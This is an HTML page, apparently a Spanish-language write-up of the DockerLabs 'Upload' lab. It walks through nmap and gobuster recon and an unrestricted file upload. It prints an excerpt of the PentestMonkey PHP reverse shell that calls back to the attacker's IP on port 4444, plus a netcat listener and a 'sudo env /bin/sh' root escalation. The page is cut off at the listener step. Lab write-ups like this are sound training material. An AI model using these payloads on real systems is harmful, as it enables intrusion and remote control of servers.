@@ -1,0 +1,1044 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Upload — DockerLabs Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Upload de DockerLabs — Dificultad: Fácil. File Upload sin restricciones → PHP Reverse Shell → sudo env /bin/sh → root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00ff88;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --blue:      #4fc3f7;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,255,136,0.06) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil  { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-dl     { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .badge-lin    { color: var(--blue);  border-color: rgba(79,195,247,0.3);  background: rgba(79,195,247,0.05); }
+    .badge-php    { color: var(--purple); border-color: rgba(191,95,255,0.3);  background: rgba(191,95,255,0.05); }
+    .badge-nmap   { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .badge-rce    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-blue   { color: var(--blue); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+    .val-purple { color: var(--purple); }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+    .prose p .hl-blue  { color: var(--blue); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+    .output-block .o-blue   { color: var(--blue); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .cve-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .cve-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .cve-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .cve-box p strong { color: var(--red); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,255,136,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.85rem; color: var(--green); margin-bottom: 0.8rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.92rem; color: var(--text-dim); line-height: 1.8; }
+    .glos-def strong { color: var(--text); }
+    .glos-def code { font-family: var(--font-mono); color: var(--yellow); font-size: 0.82rem; }
+
+    /* ROOT BANNER */
+    .root-banner {
+      border: 1px solid rgba(0,255,136,0.3); background: rgba(0,255,136,0.04);
+      padding: 2rem; margin: 2rem 0; text-align: center;
+    }
+    .root-banner-title { font-family: var(--font-disp); font-size: 1.8rem; color: var(--green); letter-spacing: 4px; text-shadow: 0 0 20px rgba(0,255,136,0.4); }
+    .root-banner-sub { font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-dim); margin-top: 0.5rem; letter-spacing: 2px; }
+
+    /* FOOTER */
+    footer {
+      border-top: 1px solid var(--dim); padding: 2.5rem 4rem;
+      text-align: center; font-family: var(--font-mono);
+      font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; line-height: 2;
+    }
+    footer span { color: var(--green); }
+
+    @media (max-width: 900px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; order: -1; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<div class="progress-container">
+  <div class="progress-bar" id="readingProgress"></div>
+</div>
+
+<a href="#main" class="skip-link">Skip to content</a>
+
+<!-- NAV -->
+<nav>
+  <a href="#" class="nav-logo">BRANDEIKS</a>
+  <a href="#" class="nav-back">WRITEUPS</a>
+</nav>
+
+<!-- HERO -->
+<header class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="#">WRITEUPS</a> / <a href="#">DOCKERLABS</a> / <span>UPLOAD</span>
+    </div>
+    <h1 class="writeup-title"><span>UPLOAD</span></h1>
+    <p class="writeup-subtitle">// File Upload sin restricciones → PHP Reverse Shell → Privilege Escalation → root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">FÁCIL</span>
+      <span class="meta-badge badge-dl">DOCKERLABS</span>
+      <span class="meta-badge badge-lin">LINUX</span>
+      <span class="meta-badge badge-rce">RCE</span>
+      <span class="meta-badge badge-php">PHP SHELL</span>
+      <span class="meta-badge badge-nmap">NMAP</span>
+      <span class="meta-date">// 13 JUN 2026</span>
+    </div>
+  </div>
+</header>
+
+<!-- MAIN LAYOUT -->
+<div class="writeup-layout" id="main">
+
+  <!-- CONTENT -->
+  <main class="writeup-content">
+
+    <!-- OVERVIEW -->
+    <div class="section visible" id="overview">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Overview</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          <strong>Upload</strong> es una máquina <span class="hl">Linux de dificultad Fácil</span> de la plataforma <span class="hl-cyan">DockerLabs</span>.
+          El objetivo es explotar un <span class="hl-red">panel de subida de archivos sin ninguna restricción</span>, permitiendo subir
+          un <span class="hl-pur">webshell PHP malicioso</span> y obtener ejecución remota de comandos en el servidor.
+        </p>
+        <p>
+          Una vez dentro como <span class="hl-blue">www-data</span>, se descubre que el usuario puede ejecutar
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/usr/bin/env</code> como root sin contraseña
+          mediante <span class="hl">sudo -l</span>. Aprovechando esta misconfiguration con la técnica de
+          <span class="hl-cyan">GTFObins</span>, escalamos privilegios a <span class="hl">root</span> con un solo comando.
+        </p>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// RESUMEN DEL ATAQUE</p>
+        <p>
+          <strong>Reconocimiento</strong> con Nmap → Puerto 80 con Apache + panel de subida →
+          <strong>Enumeración</strong> con Gobuster → directorio <code>/uploads/</code> accesible →
+          <strong>Explotación</strong>: subir <code>revershell.php</code> (PentestMonkey) →
+          Activar con <code>nc -lvnp 4444</code> → Shell como <strong>www-data</strong> →
+          <strong>PrivEsc</strong>: <code>sudo env /bin/sh</code> → <strong>root</strong>
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr>
+            <th>DATO</th>
+            <th>VALOR</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Plataforma</td><td>DockerLabs</td></tr>
+          <tr><td>Dificultad</td><td style="color:#00ffcc">FÁCIL</td></tr>
+          <tr><td>OS</td><td style="color:var(--blue)">Linux (Ubuntu)</td></tr>
+          <tr><td>Servicios</td><td>HTTP (80) — Apache 2.4.52</td></tr>
+          <tr><td>Técnicas</td><td>File Upload → RCE → sudo PrivEsc</td></tr>
+          <tr><td>Vector inicial</td><td style="color:var(--red)">Unrestricted File Upload</td></tr>
+          <tr><td>PrivEsc</td><td style="color:var(--purple)">sudo /usr/bin/env → GTFObins</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Comenzamos con un escaneo completo de puertos usando <span class="hl">Nmap</span> con detección de servicios y versiones.
+          El resultado se exporta en <span class="hl-cyan">formato XML</span> y luego se convierte a HTML visual con <span class="hl-yel">xsltproc</span>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ESCANEO NMAP COMPLETO</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX upload.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">KALI</span>
+        <div>
+          <span class="prompt">┌──(kali㉿kali)-[~/Desktop/upload]<br>└─$ </span>
+          <span class="cmd">sudo nmap
+            <span class="flag"> -p-</span>
+            <span class="flag"> -sSCV</span>
+            <span class="flag"> -n</span>
+            <span class="flag"> -Pn</span>
+            <span class="flag"> --min-rate=5000</span>
+            <span class="flag"> --open</span>
+            <span class="arg"> 172.17.0.2</span>
+            <span class="flag"> -oX</span>
+            <span class="arg"> upload.xml</span>
+          </span>
+        </div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-12 01:11 -0400</div>
+        <div>Nmap scan report for <span class="o-yellow">172.17.0.2</span></div>
+        <div>Host is up (0.0000060s latency).</div>
+        <div>Not shown: 65534 closed tcp ports (reset)</div>
+        <div>&nbsp;</div>
+        <div><span class="o-cyan">PORT     STATE  SERVICE  VERSION</span></div>
+        <div><span class="o-green">80/tcp   open   http     Apache httpd 2.4.52 ((Ubuntu))</span></div>
+        <div>|_http-title: <span class="o-white">Upload here your file</span></div>
+        <div>|_http-server-header: Apache/2.4.52 (Ubuntu)</div>
+        <div>&nbsp;</div>
+        <div>MAC Address: AE:3A:C7:9F:0D:E0 (Unknown)</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// HALLAZGO: PUERTO 80</p>
+        <p>Solo hay <strong>un puerto abierto: el 80 (HTTP)</strong>. El título de la página es <code>"Upload here your file"</code>, lo que ya nos indica directamente que existe un panel de subida de archivos. El servidor es <strong>Apache 2.4.52 en Ubuntu</strong>.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">CONVERTIR XML A HTML CON XSLTPROC</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl upload.xml > upload.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">KALI</span>
+        <div>
+          <span class="prompt">└─$ </span>
+          <span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl upload.xml</span> <span class="flag">&gt;</span> <span class="arg">upload.html</span></span>
+        </div>
+      </div>
+
+      <div class="prose">
+        <p>
+          Esto genera un <span class="hl-cyan">reporte HTML visual</span> del escaneo, más cómodo de leer en el navegador.
+          Confirmamos: solo el puerto 80 abierto, Apache 2.4.52, Ubuntu.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ENUMERACIÓN WEB -->
+    <div class="section" id="enumeracion">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Enumeración Web</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Con el puerto 80 identificado, procedemos a enumerar directorios y archivos usando <span class="hl">Gobuster</span>
+          con la wordlist <span class="hl-cyan">DirBuster</span> y extensiones clave para aplicaciones web.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">GOBUSTER — FUERZA BRUTA DE DIRECTORIOS</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x html,php,sh,py">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">KALI</span>
+        <div>
+          <span class="prompt">└─$ </span>
+          <span class="cmd">gobuster dir
+            <span class="flag"> -u</span> <span class="arg">172.17.0.2</span>
+            <span class="flag"> -w</span> <span class="arg">/usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt</span>
+            <span class="flag"> -x</span> <span class="arg">html,php,sh,py</span>
+          </span>
+        </div>
+      </div>
+
+      <div class="output-block">
+        <div>Gobuster v3.8.2 — by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</div>
+        <div>&nbsp;</div>
+        <div>[+] Url:             <span class="o-white">http://172.17.0.2</span></div>
+        <div>[+] Method:          GET</div>
+        <div>[+] Threads:         10</div>
+        <div>[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt</div>
+        <div>[+] Negative Status codes: 404</div>
+        <div>[+] Extensions:      html,php,sh,py</div>
+        <div>&nbsp;</div>
+        <div>Starting gobuster in directory enumeration mode</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">index.html</span>     (Status: <span class="o-green">200</span>) [Size: 1361]</div>
+        <div><span class="o-yellow">uploads</span>        (Status: <span class="o-yellow">301</span>) [Size: 310] [<span class="o-cyan">--> http://172.17.0.2/uploads/</span>]</div>
+        <div><span class="o-green">upload.php</span>     (Status: <span class="o-green">200</span>) [Size: 1357]</div>
+        <div><span class="o-red">server-status</span>  (Status: <span class="o-red">403</span>) [Size: 275]</div>
+        <div>&nbsp;</div>
+        <div>Progress: 1038205 / 1038205 (100.00%)</div>
+        <div>Finished</div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// HALLAZGOS CRÍTICOS</p>
+        <p>
+          <strong>upload.php</strong> → el script que procesa la subida de archivos.<br>
+          <strong>/uploads/</strong> → directorio donde se almacenan los archivos subidos, accesible públicamente (301 → 200).<br>
+          Esto confirma la ruta de ataque: si el servidor no valida el tipo de archivo, podemos subir un <strong>webshell PHP</strong> y ejecutarlo directamente desde el navegador.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">INSPECCIÓN MANUAL — http://172.17.0.2/</span>
+      </div>
+
+      <div class="prose">
+        <p>
+          Al visitar <span class="hl-cyan">http://172.17.0.2/</span> encontramos una página minimalista titulada
+          <span class="hl">"Upload File"</span> con un formulario de subida. No hay validación visible ni
+          restricciones de tipo de archivo en el frontend. El directorio <span class="hl-yel">/uploads/</span>
+          tiene <span class="hl-red">directory listing habilitado</span>, lo que nos permitirá ver y acceder
+          al archivo que subamos.
+        </p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- EXPLOTACIÓN -->
+    <div class="section" id="explotacion">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Explotación — Reverse Shell</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          El vector de ataque es un <span class="hl-red">Unrestricted File Upload</span>: el servidor acepta
+          cualquier tipo de archivo sin validar la extensión ni el contenido. Subiremos un
+          <span class="hl-pur">PHP Reverse Shell</span> usando el payload de <strong>PentestMonkey</strong>,
+          obtenido desde <span class="hl-cyan">revshells.com</span>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">CREAR LA REVERSE SHELL PHP</span>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// CONFIGURACIÓN DEL PAYLOAD</p>
+        <p>
+          Fuente: <strong>https://www.revshells.com/</strong> → PHP PentestMonkey<br>
+          Modificar en el archivo: <code>$ip = "192.168.111.128"</code> (tu IP en eth0) y <code>$port = 4444</code>
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nano revershell.php">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">KALI</span>
+        <div><span class="prompt">└─$ </span><span class="cmd">nano <span class="arg">revershell.php</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-purple">&lt;?php</span></div>
+        <div><span class="o-green">// php-reverse-shell — A Reverse Shell implementation in PHP.</span></div>
+        <div><span class="o-green">// https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></div>
+        <div>&nbsp;</div>
+        <div>set_time_limit (0);</div>
+        <div>$VERSION = <span class="o-yellow">"1.0"</span>;</div>
+        <div>$ip = <span class="o-yellow">'192.168.111.128'</span>;  <span class="o-cyan">// CAMBIAR: tu IP (eth0)</span></div>
+        <div>$port = <span class="o-yellow">4444</span>;             <span class="o-cyan">// CAMBIAR: tu puerto de escucha</span></div>
+        <div>$chunk_size = 1400;</div>
+        <div>$shell = <span class="o-yellow">'uname -a; w; id; sh -i'</span>;</div>
+        <div>...</div>
+      </div>
+
+      <div class="prose">
+        <p>
+          Una vez editado el archivo con nuestra IP y puerto, lo subimos mediante el panel web en
+          <span class="hl-cyan">http://172.17.0.2/</span>. El servidor <span class="hl">acepta el archivo .php sin restricciones</span>
+          y lo almacena en <span class="hl-yel">/uploads/revershell.php</span>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">INICIAR LISTENER CON NETCAT</span>
+      </div>
+
+      <div class="prose">
+        <p>
+          Antes de ejecutar el webshell, abrimos un <span class="hl">listener en el puerto 4444</span>
+          con Netcat para recibir la conexión entrante de la reverse shell.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nc -lvnp 4444">
